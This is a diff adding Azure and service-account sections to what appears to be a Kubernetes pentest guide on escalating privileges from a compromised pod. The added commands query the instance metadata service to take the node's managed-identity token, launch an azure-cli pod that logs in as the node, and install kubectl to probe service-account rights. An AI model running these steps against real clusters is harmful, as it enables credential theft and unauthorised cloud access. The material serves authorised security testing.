@@ -101,8 +101,9 @@ https://www.googleapis.com/auth/service.management.readonly
 https://www.googleapis.com/auth/trace.append
 ```
 
-If you can query the metadata service, you can proceed with curl, but I suggest deploying another pod with the `gcr.io/google.com/cloudsdktool/cloud-sdk:latest` image. This allows you to use `gcloud` and `gsutil` as the node.
+**Launch a new pod with the cloud-sdk**
 
+If you can query the metadata service, you can proceed with curl, but I suggest deploying another pod with the `gcr.io/google.com/cloudsdktool/cloud-sdk:latest` image. This allows you to use `gcloud` and `gsutil` as the node.
 Something like this: 
 
 ```yaml
@@ -136,9 +137,67 @@ An awesome GCP privesc reference: https://about.gitlab.com/blog/2020/02/12/plund
 
 ### Azure
 
+**Test to see if you have access to the metadata service**
+```
+curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2020-10-01" | jq .
+```
+
+**If an managed identity is assigned to the node, you can access the node's identify token**
+```
+ curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq .
+ ```
+
+**Launch a new pod with the azure-cli**
+If you can query the metadata service, you can proceed with curl, but I suggest deploying another pod with the `mcr.microsoft.com/azure-cli` image. This allows you to use `az` as the node.
+
+Something like this: 
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: nothing-allowed-azurecli-pod
+  labels:
+    app: pentest
+spec:
+  containers:
+  - name: nothing-allowed-azurecli-pod
+    image: mcr.microsoft.com/azure-cli
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+```
+
+**Login in as the instance**
+```
+bash-5.0# az login -i
+```
+
+**Some recon ideas**
+```
+az storage account list
+az aks list
+az identity list
+az role assignment list
+```
 
 ## Overly permissive service account
 If the default service account is mounted to your pod and is overly permissive, you can use that token to further escalate your privs within the cluster.
+
+**Install kubectl in your pod**
+```
+if [ ! -f  "/usr/local/bin/kubectl" ]; then
+  apt update && apt -y install curl
+  #Download and install kubectl into pod
+  curl -LO "https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl"
+  chmod +x ./kubectl
+  mv ./kubectl /usr/local/bin/kubectl
+fi
+```
+**See what your pod can do**
+```
+kubectl auth can-i --list
+```
+
 
 ## Anonymous-auth
 If either [the apiserver or the kubelets have anonymous-auth set to true](https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/), and there are no network policy controls preventing it, you can interact with them directly without authentication. 
